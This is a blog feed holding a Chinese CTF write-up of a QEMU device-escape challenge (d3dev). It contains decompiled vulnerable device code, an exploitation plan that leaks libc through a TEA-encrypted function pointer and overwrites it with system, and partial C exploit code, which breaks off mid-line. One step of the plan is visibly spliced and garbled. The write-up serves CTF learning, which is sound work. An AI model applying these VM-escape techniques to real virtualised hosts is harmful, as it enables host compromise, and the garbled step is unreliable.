<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Nop&#39;s Blog</title>
  
  <subtitle>There is a long way to go...</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://n0nop.github.io/"/>
  <updated>2021-03-28T14:19:44.886Z</updated>
  <id>https://n0nop.github.io/</id>
  
  <author>
    <name>Nop</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>AntCTFxD^3CTF pwn 分析</title>
    <link href="https://n0nop.github.io/2021/03/28/AntCTFxD-3CTF-pwn-%E5%88%86%E6%9E%90/"/>
    <id>https://n0nop.github.io/2021/03/28/AntCTFxD-3CTF-pwn-%E5%88%86%E6%9E%90/</id>
    <published>2021-03-28T14:17:10.000Z</published>
    <updated>2021-03-28T14:19:44.886Z</updated>
    
    <content type="html"><![CDATA[<p>本文首发于安全客：<a href="https://www.anquanke.com/post/id/234263" target="_blank" rel="noopener">https://www.anquanke.com/post/id/234263</a></p><p>分享一下比赛中除了Deterministic Heap之外的<del>六</del>五道题。</p><a id="more"></a><h1 id="d3dev-amp-d3dev-revenge"><a href="#d3dev-amp-d3dev-revenge" class="headerlink" title="d3dev &amp; d3dev_revenge"></a>d3dev &amp; d3dev_revenge</h1><p>一道简单的qemu pwn，很适合入门，入门知识可参考<a href="https://ray-cp.github.io/archivers/qemu-pwn-basic-knowledge" target="_blank" rel="noopener">qemu-pwn-基础知识</a>，这里就不再赘述。</p><ol><li><p>首先查看<code>launch.sh</code>启动脚本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">./qemu-system-x86_64 \</span><br><span class="line">-L pc-bios/ \</span><br><span class="line">-m 128M \</span><br><span class="line">-kernel vmlinuz \</span><br><span class="line">-initrd rootfs.img \</span><br><span class="line">-smp 1 \</span><br><span class="line">-append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 nokaslr quiet" \</span><br><span class="line">-device d3dev \</span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-nographic \</span><br></pre></td></tr></table></figure><p>一般来说，从参数<code>-device d3dev</code>中可以得知，我们要分析的就是这个<code>d3dev</code>设备逻辑，而且通常就是这个设备中存在着漏洞。</p></li><li><p>分析所给的<code>qemu-system-x86_64</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">do_qemu_init_pci_d3dev_register_types</span><br><span class="line">d3dev_mmio_read</span><br><span class="line">d3dev_mmio_write</span><br><span class="line">d3dev_pmio_read</span><br><span class="line">pci_d3dev_register_types</span><br><span class="line">d3dev_class_init</span><br><span class="line">pci_d3dev_realize</span><br><span class="line">d3dev_instance_init</span><br><span class="line">d3dev_pmio_write</span><br></pre></td></tr></table></figure><p>主要关注”d3dev”相关函数，从<code>d3dev_class_init</code>中，可以获得到<code>VenderID</code>以及<code>DeviceID</code>，从而找到目标PCI设备，从而获得相关的设备内存空间地址：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">/ # lspci</span><br><span class="line">00:01.0 Class 0601: 8086:7000</span><br><span class="line">00:04.0 Class 0200: 8086:100e</span><br><span class="line">00:00.0 Class 0600: 8086:1237</span><br><span class="line">00:01.3 Class 0680: 8086:7113</span><br><span class="line">00:03.0 Class 00ff: 2333:11e8 ===&gt; d3dev</span><br><span class="line">00:01.1 Class 0101: 8086:7010</span><br><span class="line">00:02.0 Class 0300: 1234:1111</span><br><span class="line">/ # cat /sys/devices/pci0000\:00/0000:00\:03.0/resource</span><br><span class="line">0x00000000febf1000 0x00000000febf17ff 0x0000000000040200==&gt; mmio (start end size)</span><br><span class="line">0x000000000000c040 0x000000000000c05f 0x0000000000040101==&gt; pmio (start end size)</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure><p>编写guest程序与设备交互的时候，可以直接映射设备地址，也可通过<code>int mmio_fd = open(&quot;/sys/devices/pci0000:00/0000:00:03.0/resource0&quot;, O_RDWR | O_SYNC);</code>来进行映射。</p><p>上图中两个地址分别对应mmio和pmio。</p></li><li><p>分析<code>d3dev_mmio_write</code>可以很容易发现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">d3dev_mmio_write</span><span class="params">(d3devState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">size</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// rsi</span></span><br><span class="line">  ObjectClass_0 **v5; <span class="comment">// r11</span></span><br><span class="line">  <span class="keyword">uint64_t</span> v6; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">uint32_t</span> v8; <span class="comment">// er10</span></span><br><span class="line">  <span class="keyword">uint32_t</span> v9; <span class="comment">// er9</span></span><br><span class="line">  <span class="keyword">uint32_t</span> v10; <span class="comment">// er8</span></span><br><span class="line">  <span class="keyword">uint32_t</span> v11; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v12; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">uint64_t</span> v13; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">size</span> == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = opaque-&gt;<span class="built_in">seek</span> + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(addr &gt;&gt; <span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span> ( opaque-&gt;mmio_write_part )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = &amp;opaque-&gt;pdev.qdev.parent_obj.class + v4;</span><br><span class="line">      v6 = val &lt;&lt; <span class="number">32</span>;</span><br><span class="line">      v7 = <span class="number">0</span>;</span><br><span class="line">      opaque-&gt;mmio_write_part = <span class="number">0</span>;</span><br><span class="line">      v8 = opaque-&gt;key[<span class="number">0</span>];</span><br><span class="line">      v9 = opaque-&gt;key[<span class="number">1</span>];</span><br><span class="line">      v10 = opaque-&gt;key[<span class="number">2</span>];</span><br><span class="line">      v11 = opaque-&gt;key[<span class="number">3</span>];</span><br><span class="line">      v12 = v6 + *((_DWORD *)v5 + <span class="number">0x2B6</span>);</span><br><span class="line">      v13 = ((<span class="keyword">unsigned</span> __int64)v5[<span class="number">0x15B</span>] + v6) &gt;&gt; <span class="number">32</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v7 -= <span class="number">0x61C88647</span>;</span><br><span class="line">        v12 += (v7 + v13) ^ (v9 + ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)v13 &gt;&gt; <span class="number">5</span>)) ^ (v8 + <span class="number">16</span> * v13);</span><br><span class="line">        LODWORD(v13) = ((v7 + v12) ^ (v11 + (v12 &gt;&gt; <span class="number">5</span>)) ^ (v10 + <span class="number">16</span> * v12)) + v13;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v7 != <span class="number">0xC6EF3720</span> );</span><br><span class="line">      v5[<span class="number">0x15B</span>] = (ObjectClass_0 *)__PAIR64__(v13, v12);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;mmio_write_part = <span class="number">1</span>;</span><br><span class="line">      opaque-&gt;blocks[v4] = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)val; <span class="comment">// index overflow</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后<code>opaque-&gt;blocks[v4] = (unsigned int)val;</code>存在下标溢出，即<code>v4 = opaque-&gt;seek + (unsigned int)(addr &gt;&gt; 3);</code>，而<code>opaque-&gt;seek</code>可以通过<code>d3dev_pmio_write</code>进行设置，最大值为0x100，此时只要通过完全可控的addr，就能实现下标溢出。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">d3dev_pmio_write</span><span class="params">(d3devState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">size</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint32_t</span> *v4; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( addr == <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( val &lt;= <span class="number">0x100</span> )</span><br><span class="line">      opaque-&gt;<span class="built_in">seek</span> = val;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( addr &gt; <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">0x1C</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;r_seed = val;</span><br><span class="line">      v4 = opaque-&gt;key;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        *v4++ = ((__int64 (__fastcall *)(<span class="keyword">uint32_t</span> *, __int64, <span class="keyword">uint64_t</span>, _QWORD))opaque-&gt;rand_r)(</span><br><span class="line">                  &amp;opaque-&gt;r_seed,</span><br><span class="line">                  <span class="number">0x1C</span>LL,</span><br><span class="line">                  val,</span><br><span class="line">                  *(_QWORD *)&amp;<span class="built_in">size</span>);</span><br><span class="line">      <span class="keyword">while</span> ( v4 != (<span class="keyword">uint32_t</span> *)&amp;opaque-&gt;rand_r );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( addr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_QWORD *)opaque-&gt;key = <span class="number">0L</span>L;</span><br><span class="line">      *(_QWORD *)&amp;opaque-&gt;key[<span class="number">2</span>] = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    opaque-&gt;memory_mode = val;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而继续分析相关结构体<code>d3devState</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> d3devState      struc ; (<span class="keyword">sizeof</span>=<span class="number">0x1300</span>, align=<span class="number">0x10</span>, copyof_4545)</span><br><span class="line"><span class="number">00000000</span> pdev            PCIDevice_0 ?</span><br><span class="line"><span class="number">000008E0</span> mmio            MemoryRegion_0 ?</span><br><span class="line"><span class="number">000009</span>D0 pmio            MemoryRegion_0 ?</span><br><span class="line"><span class="number">00000</span>AC0 memory_mode     dd ?</span><br><span class="line"><span class="number">00000</span>AC4 <span class="built_in">seek</span>            dd ?</span><br><span class="line"><span class="number">00000</span>AC8 init_flag       dd ?</span><br><span class="line"><span class="number">00000</span>ACC mmio_read_part  dd ?</span><br><span class="line"><span class="number">00000</span>AD0 mmio_write_part dd ?</span><br><span class="line"><span class="number">00000</span>AD4 r_seed          dd ?</span><br><span class="line"><span class="number">00000</span>AD8 blocks          dq <span class="number">257</span> dup(?)</span><br><span class="line"><span class="number">000012E0</span> key             dd <span class="number">4</span> dup(?)</span><br><span class="line"><span class="number">000012F</span>0 rand_r          dq ?                    ; offset</span><br><span class="line"><span class="number">000012F</span>8                 db ? ; undefined</span><br><span class="line"><span class="number">000012F</span>9                 db ? ; undefined</span><br><span class="line"><span class="number">000012F</span>A                 db ? ; undefined</span><br><span class="line"><span class="number">000012F</span>B                 db ? ; undefined</span><br><span class="line"><span class="number">000012F</span>C                 db ? ; undefined</span><br><span class="line"><span class="number">000012F</span>D                 db ? ; undefined</span><br><span class="line"><span class="number">000012F</span>E                 db ? ; undefined</span><br><span class="line"><span class="number">000012F</span>F                 db ? ; undefined</span><br><span class="line"><span class="number">00001300</span> d3devState      ends</span><br></pre></td></tr></table></figure><p>可以看出，<code>blocks</code>后面存在着一个函数指针<code>rand_r</code>，而通过<code>d3dev_pmio_write</code>中<code>addr == 0x1C</code>的情况，发现<code>rand_r</code>函数的第一个参数<code>r-&gt;seed</code>也是可控的，因此完全可以通过其实现调用<code>system(&quot;cat flag&quot;)</code>。</p></li><li><p>那么整个利用过程为：</p><ul><li>通过调用<code>d3dev_pmio_write</code>，即<code>outw(0, 0xC040 + 0x4);</code>将<code>keys</code>全部设置为0。</li><li>再通过调用<code>d3dev_pmio_write</code>，即<code>outw(0x100,d] = mmio_read(0x18); res[1] = mmio_read(0x18)</code>读出<code>rand_r</code>函数地址（TEA加密后的），再解密得到明文，算出libc的基地址。</li><li>计算出<code>system</code>的地址，由于<code>d3dev_mmio_write</code>的写内存模式为：先写入低4 bytes，然后结合第二次传入的4 bytes作为高4 bytes组合成8 bytes，TEA加密（解密）后再写入对应内存中。所以只要先加密<code>system</code>的地址，然后分两次（先低后高）写入即可<code>opaque-&gt;rand_r</code>处即可。</li><li>最后触发调用<code>rand_r</code>，即可得到flag。</li></ul></li><li><p>exp：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT  12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> page_offset(<span class="keyword">uint32_t</span> addr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> addr &amp; ((<span class="number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> gva_to_gfn(<span class="keyword">void</span> *addr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> pme, gfn;</span><br><span class="line">    <span class="keyword">size_t</span> offset;</span><br><span class="line">    offset = ((<span class="keyword">uintptr_t</span>)addr &gt;&gt; <span class="number">9</span>) &amp; ~<span class="number">7</span>;</span><br><span class="line">    lseek(fd, offset, SEEK_SET);</span><br><span class="line">    <span class="built_in">read</span>(fd, &amp;pme, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (!(pme &amp; PFN_PRESENT))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    gfn = pme &amp; PFN_PFN;</span><br><span class="line">    <span class="keyword">return</span> gfn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> gva_to_gpa(<span class="keyword">void</span> *addr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> gfn = gva_to_gfn(addr);</span><br><span class="line">    assert(gfn != <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="keyword">uint64_t</span>)addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint32_t</span> *)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> mmio_read(<span class="keyword">uint32_t</span> addr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint32_t</span> *)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encrypt</span> <span class="params">(<span class="keyword">uint32_t</span>* v, <span class="keyword">uint32_t</span>* k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0</span>, i;           <span class="comment">/* set up */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> delta=<span class="number">0x9e3779b9</span>;                     <span class="comment">/* a key schedule constant */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];   <span class="comment">/* cache key */</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;                       <span class="comment">/* basic cycle start */</span></span><br><span class="line">        sum += delta;</span><br><span class="line">        v0 += ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);</span><br><span class="line">        v1 += ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);  </span><br><span class="line">    &#125;                                              <span class="comment">/* end cycle */</span></span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrypt</span> <span class="params">(<span class="keyword">uint32_t</span>* v, <span class="keyword">uint32_t</span>* k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0xC6EF3720</span>, i;  <span class="comment">/* set up */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> delta=<span class="number">0x9e3779b9</span>;                     <span class="comment">/* a key schedule constant */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];   <span class="comment">/* cache key */</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++) &#123;                         <span class="comment">/* basic cycle start */</span></span><br><span class="line">        v1 -= ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);</span><br><span class="line">        v0 -= ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);</span><br><span class="line">        sum -= delta;                                   </span><br><span class="line">    &#125;                                              <span class="comment">/* end cycle */</span></span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fd = <span class="built_in">open</span>(<span class="string">"/proc/self/pagemap"</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">"open"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="keyword">int</span> mmio_fd = <span class="built_in">open</span>(<span class="string">"/sys/devices/pci0000:00/0000:00:03.0/resource0"</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span>(mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">"mmio_fd open failed"</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">"mmap mmio_mem failed"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"mmio_mem @ %p\n"</span>, mmio_mem);</span><br><span class="line"></span><br><span class="line">    mlock(<span class="built_in">buffer</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Your physical address is at 0x%"</span>PRIx64<span 